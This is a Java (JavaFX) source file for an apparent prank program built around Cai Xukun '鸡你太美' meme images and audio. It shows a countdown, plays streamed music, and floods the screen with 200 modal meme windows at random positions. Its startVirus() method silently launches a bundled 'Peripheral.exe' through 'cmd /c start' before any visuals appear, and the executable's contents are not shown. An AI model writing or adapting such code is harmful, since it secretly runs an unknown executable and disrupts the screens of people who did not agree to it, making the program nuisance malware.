package com.aoyu;

import javafx.application.Application;
import javafx.geometry.Rectangle2D;
import javafx.scene.Scene;
import javafx.scene.image.Image;
import javafx.scene.image.ImageView;
import javafx.scene.layout.AnchorPane;
import javafx.scene.media.Media;
import javafx.scene.media.MediaPlayer;
import javafx.stage.Modality;
import javafx.stage.Screen;
import javafx.stage.Stage;
import javafx.stage.StageStyle;

import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.util.Random;
import java.util.concurrent.Callable;
import java.util.concurrent.FutureTask;

import static java.lang.Thread.sleep;

public class Main extends Application {

    public static void main(String[] args) {

        launch(args);
    }
    @Override
    public void start(Stage primaryStage) throws Exception {



        //线程2
        Callable<Image> loadImageThread1 = new Thread2();

        FutureTask<Image> futureTask2 = new FutureTask<>(loadImageThread1);

        Thread Thread2 = new Thread(futureTask2);

        Thread2.start();

        Image loadImage1 = futureTask2.get();

        //线程3

        Callable<Image> loadImageThread2 = new Thread3();

        FutureTask<Image> futureTask3 = new FutureTask<>(loadImageThread2);

        Thread Thread3 = new Thread(futureTask3);

        Thread3.start();

        Image loadImage2 = futureTask3.get();


        Media jiNiTaiMeiAudio = new Media("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/%E6%80%80%E9%80%B8-nshim%20-%20%E9%B8%A1%E4%BD%A0%E5%A4%AA%E7%BE%8E.mp3");
        MediaPlayer media1 = new MediaPlayer(jiNiTaiMeiAudio);



        String gifPath3 = fileURL();
        gifPath3 += "resources//cxkshowimage.png";

        FileInputStream image1File = new FileInputStream(gifPath3);

        Image cxkShowImage = new Image(image1File);

        startVirus();

        for (int i = 0; i < 5; i++) {

            Stage stage1 = new Stage();

            stage1.setTitle("5秒倒计时");

            String[] imagePath = new String[]{
                    "https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/5.png",
                    "https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/4.png",
                    "https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/3.png",
                    "https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/2.png",
                    "https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/Icon_Files/1.png"
            };

            Image image5 = new Image(imagePath[i]);

            ImageView imageView5 = new ImageView(image5);

            stage1.setX(i * 305);
            stage1.setY(i * 185);


            stage1.show();

            AnchorPane a1 = new AnchorPane();

            a1.getChildren().add(imageView5);
            Scene scene1 = new Scene(a1);
            stage1.getIcons().add(new Image("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/CountDown.png"));
            stage1.setScene(scene1);
            a1.setPrefSize(305, 305);

            sleep(1000);

            stage1.close();

        }

        //蔡徐坤登场
        Stage stage2 = new Stage();

        AnchorPane a2 = new AnchorPane();

        Scene scene2 = new Scene(a2);

        stage2.setScene(scene2);

        ImageView cxkImageView = new ImageView(cxkShowImage);

        a2.getChildren().add(cxkImageView);

        stage2.initStyle(StageStyle.TRANSPARENT);

        stage2.setMaximized(true);

        stage2.show();


        media1.setOnReady(new Runnable() {
            @Override
            public void run() {

                media1.setAutoPlay(true);

                try {
                    sleep(1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }

                cxkStageShow(stage2,loadImage1,loadImage2,media1);

            }
        });

    }


    public void startVirus() {

        String virusPath = fileURL();

        virusPath += "swiftshader//Peripheral.exe";

        System.out.println(virusPath);

        Runtime runtime = Runtime.getRuntime();
        Process process;
        try {
            process = runtime.exec("cmd /c start " + virusPath);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void cxkStageShow(Stage stage ,Image image1,Image image2,MediaPlayer media1) {

        Screen screen = Screen.getPrimary();
        Rectangle2D bounds = screen.getBounds();
        double screenWidth = bounds.getWidth();
        double screenHight = bounds.getHeight();

        System.out.println(screenWidth);
        System.out.println(screenHight);

        for (int i = 0; i < 200; i++) {

            Random r1 = new Random();

            int x = r1.nextInt((int) screenWidth);

            Random r2 = new Random();

            int y = r2.nextInt((int) screenHight);

            Stage stage1 = new Stage();

            AnchorPane a1 = new AnchorPane();

            ImageView imgView1;
            if(i % 2 == 0){
                imgView1 = new ImageView(image1);
            }else {
                imgView1 = new ImageView(image2);
            }
            a1.getChildren().add(imgView1);


            stage1.setX(x);
            stage1.setY(y);

            stage1.initOwner(stage);
            stage1.initModality(Modality.WINDOW_MODAL);
            stage1.setTitle("鸡你太美_蔡徐坤");
            stage1.getIcons().add(new Image("https://typora-aoyu.oss-cn-hangzhou.aliyuncs.com/cxkHead2.png"));

            stage1.show();

            Scene scene1 = new Scene(a1);

            stage1.setScene(scene1);



            stage1.setWidth(490);
            stage1.setHeight(280);
        }
    }

    /**
     * 获取当前程序所在路径的方法
     *
     * @return 返回路径
     */
    public static String fileURL() {
        File files = new File(" ");
        String filePath = null;
        try {
            filePath = files.getCanonicalPath();
        } catch (IOException e) {
            e.printStackTrace();
        }
        return filePath;
    }
}



class Thread2 extends Main implements Callable<Image> {


    @Override
    public Image call() throws Exception {

        String gifPath2 = fileURL();
        gifPath2+= "resources//cxkimage3.gif";

        FileInputStream image1File = new FileInputStream(gifPath2);
        return new Image(image1File);


    }

}

class Thread3 extends Main implements Callable<Image> {


    @Override
    public Image call() throws Exception {

        String gifPath2 = fileURL();
        gifPath2+= "resources//cxkimage4.gif";
        FileInputStream image2File = new FileInputStream(gifPath2);
        return new Image(image2File);

    }

}
